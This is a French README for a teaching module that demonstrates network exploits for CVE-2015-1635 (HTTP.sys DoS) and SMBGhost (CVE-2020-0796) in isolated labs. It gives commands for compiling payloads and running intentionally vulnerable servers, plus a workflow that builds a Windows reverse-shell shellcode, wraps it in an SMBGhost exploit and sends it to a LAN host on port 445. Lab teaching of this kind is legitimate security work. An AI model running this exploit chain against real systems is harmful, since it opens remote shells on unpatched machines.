# 📚 Packet Forger Labs

Démonstrations pédagogiques contrôlées de vulnérabilités réseau et d'exploits.

## ⚠️ Avertissement

**Ce module est destiné UNIQUEMENT à des fins pédagogiques et de recherche.**

- ⚠️ Ne pas utiliser sur des systèmes de production
- ⚠️ Utiliser uniquement dans un environnement de test isolé
- ⚠️ Respecter les lois locales concernant les tests de sécurité

## 📁 Structure

```
packet-forger-labs/
├── cve/              # Implémentations CVE
├── servers/          # Serveurs vulnérables de test
├── scripts/          # Scripts de test et validation
├── docs/             # Documentation pédagogique
└── captures/         # Captures réseau annotées
```

## 🎯 Objectif

Ce module fournit :
- Des **implémentations pédagogiques** de CVEs réseau
- Des **serveurs vulnérables** pour tests contrôlés
- De la **documentation** expliquant chaque vulnérabilité
- Des **scripts de test** pour validation

## 📋 CVEs Disponibles

### CVE-2015-1635 (MS15-034) - HTTP.sys DoS
- **Type**: Buffer Overflow / DoS
- **Protocole**: HTTP
- **Fichier**: `cve/CVE-2015-1635-http-dos.c`
- **Documentation**: `docs/CVE-2015-1635.md`

### CVE-2020-0796 (SMBGhost) - SMBv3 Compression
- **Type**: Buffer Overflow / RCE
- **Protocole**: SMBv3.1.1
- **Fichier**: `cve/CVE-2020-0796-smbghost.c`
- **Documentation**: `docs/CVE-2020-0796.md`

## 🧪 Utilisation

### 1. Démarrer un serveur vulnérable

```bash
# Serveur HTTP vulnérable
cd servers
python3 vulnerable_http_server.py 8080

# Serveur SMB vulnérable (nécessite root)
sudo python3 vulnerable_smb_server.py 445
```

### 2. Tester avec packet-forger-core

```bash
# Générer un payload CVE
cd cve
gcc -o test_cve CVE-2015-1635-http-dos.c
./test_cve > payload.bin

# Transporter via le core
cd ../../packet-forger-core
sudo ./bin/packet-forger-core \
    --payload ../packet-forger-labs/cve/payload.bin \
    --target 127.0.0.1 \
    --port 8080
```

### 3. Utiliser les scripts de test

```bash
# Test CVE-2015-1635
cd scripts
chmod +x test_cve_2015_1635.sh
./test_cve_2015_1635.sh 127.0.0.1 8080 /iisstart.htm

# Démarrer tous les serveurs
chmod +x run_vulnerable_servers.sh
./run_vulnerable_servers.sh
```

## 🔗 Intégration avec Packet Forger Suite

### Workflow Complet

```bash
# 1. Générer un payload shellcode
cd ../packet-forger-payloads
./bin/payload-builder build windows reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --output payload.bin

# 2. Encapsuler dans un exploit CVE (ex: SMBGhost)
cd ../packet-forger-labs
python3 -c "
from cve.CVE_2020_0796_smbghost import generate_smb_compression_payload
with open('../packet-forger-payloads/payload.bin', 'rb') as f:
    shellcode = f.read()
payload = bytearray(4096)
len = generate_smb_compression_payload(shellcode, len(shellcode), payload, 4096)
with open('exploit.bin', 'wb') as f:
    f.write(payload[:len])
"

# 3. Transporter via le core
cd ../packet-forger-core
sudo ./bin/packet-forger-core \
    --payload ../packet-forger-labs/exploit.bin \
    --target 192.168.10.5 \
    --port 445
```

## 📖 Documentation

Chaque CVE dispose de sa propre documentation dans `docs/` :
- Description technique
- Détails de la vulnérabilité
- Instructions de test
- Références

## 🎓 Objectifs Pédagogiques

Ce module permet d'apprendre :
- Comment fonctionnent les vulnérabilités réseau
- Comment les exploits sont structurés
- Comment tester de manière contrôlée
- Comment analyser les captures réseau

## 🔒 Sécurité

- **Isolation**: Utiliser uniquement dans un environnement isolé
- **Sandbox**: Utiliser des VMs dédiées pour les tests
- **Monitoring**: Capturer et analyser le trafic réseau
- **Documentation**: Comprendre avant d'exploiter

## 📝 Notes

- Les serveurs vulnérables sont des **simulations** pour démonstration
- Les implémentations CVE sont **simplifiées** pour la pédagogie
- Les exploits réels nécessitent des techniques plus avancées
- Ce module ne remplace pas une formation en sécurité

---

**Rappel**: Utilisation pédagogique uniquement. Respecter les lois locales.
